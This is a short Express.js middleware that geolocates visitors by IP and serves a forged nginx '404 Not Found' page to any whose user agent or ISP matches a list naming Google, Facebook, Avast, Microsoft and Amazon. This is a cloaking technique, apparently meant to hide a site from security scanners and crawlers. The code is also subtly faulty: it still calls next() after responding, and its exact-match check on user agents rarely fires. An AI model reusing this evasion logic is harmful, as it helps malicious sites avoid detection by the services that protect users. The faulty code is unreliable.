const { IP2Location } = require("ip2location-nodejs");
const asyncHandler = require("express-async-handler");

const ip2location = new IP2Location();
const ip2locationV6 = new IP2Location();


ip2location.open("../utils/IPV4.BIN");
ip2locationV6.open("../utils/IPV6.BIN");
let ip = ""
let agent = ""

function GetBotIP(ip) {
    const isV6 = ip.indexOf(":");
    if (isV6 > -1) {
        return ip2locationV6.getAll(ip);
    } else {
        return ip2location.getAll(ip);
    }

}
function blockAgent(agent2) {
    const agent = agent2.toLowerCase();
    const listBlock = ['google', 'facebook', 'avast'];
    const check = listBlock.includes(agent);
    if (check) return true;
    return false;
}
function blockISP(value2) {
    const value = value2.toLowerCase();
    const listBlock = ['google', 'google bot', 'facebook', 'facebot', 'chrome', 'microsoft', 'amazon', 'avast', 'fpt telecom company'];
    const check = listBlock.includes(value);
    if (check) return true;
    return false;
}


const chanbot = asyncHandler(async (req, res, next) => {
    try {
        const agent = req.headers['user-agent'];
        const ipinfo = GetBotIP(req.ip)
        let block = false;
        if (agent) { block = blockAgent(agent); }
        if (!block && ipinfo.isp) { block = (blockISP(ipinfo.isp)) }
        if (!block && ipinfo.domain) { block = blockISP(ipinfo.domain); }
        if (block) {
            console.error("BOT " + agent);
            res.status(404).end("<html>\n<head><title>404 Not Found</title></head>\n<body bgcolor=\"white\">\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.14.0 (Ubuntu)</center>\n</body>\n</html>\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n<!-- a padding to disable MSIE and Chrome friendly error page -->\n");
        }
        next()
    }
    catch (error) {
        next(error);
    }
})


module.exports = { chanbot };
